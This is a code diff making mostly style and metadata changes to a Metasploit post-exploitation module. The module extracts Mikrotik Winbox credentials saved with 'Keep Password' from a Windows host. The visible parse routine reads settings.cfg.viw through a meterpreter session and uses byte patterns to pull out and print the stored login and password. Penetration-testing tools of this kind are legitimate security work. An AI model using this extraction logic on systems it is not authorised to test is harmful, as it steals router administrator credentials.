@@ -12,15 +12,21 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name'          => 'Windows Gather Mikrotik Winbox "Keep Password" Credentials Extractor',
-        'Description'   => %q{ This module extracts Mikrotik Winbox credentials saved in the
+        'Name' => 'Windows Gather Mikrotik Winbox "Keep Password" Credentials Extractor',
+        'Description' => %q{
+          This module extracts Mikrotik Winbox credentials saved in the
           "settings.cfg.viw" file when the "Keep Password" option is
           selected in Winbox.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Pasquale \'sid\' Fiorillo' ], # www.pasqualefiorillo.it - Thanks to: www.isgroup.biz
-        'Platform'      => [ 'win', ],
-        'SessionTypes'  => [ 'meterpreter' ],
+        'License' => MSF_LICENSE,
+        'Author' => ['Pasquale \'sid\' Fiorillo'], # www.pasqualefiorillo.it - Thanks to: www.isgroup.biz
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -72,27 +78,25 @@ class MetasploitModule < Msf::Post
       ascii_values = chunk.gsub(/[^[:print:]]/, '.')
       print_status("#{hex_values.ljust(48)} #{ascii_values}")
     end
-  rescue EOFError
   rescue Errno::ENOENT
     print_error("File not found: #{path}")
-  rescue => e
+  rescue StandardError => e
     print_error("An error occurred: #{e.message}")
   end
 
   def parse(path)
     file = client.fs.file.new(path, 'rb')
-    buffer = file.read()
+    buffer = file.read
 
     login = buffer.match(/\x00\x05login(.*)\x08\x00/)
     print_good("Login: #{login[1]}")
 
     password = buffer.match(/\x00\x03pwd(.*)\x0B\x00/)
     print_good("Password: #{password[1]}")
-  rescue EOFError
   rescue Errno::ENOENT
     print_error("File not found: #{path}")
-  rescue => e
+  rescue StandardError => e
     print_error("An error occurred: #{e.message}")
   end
-    
+
 end
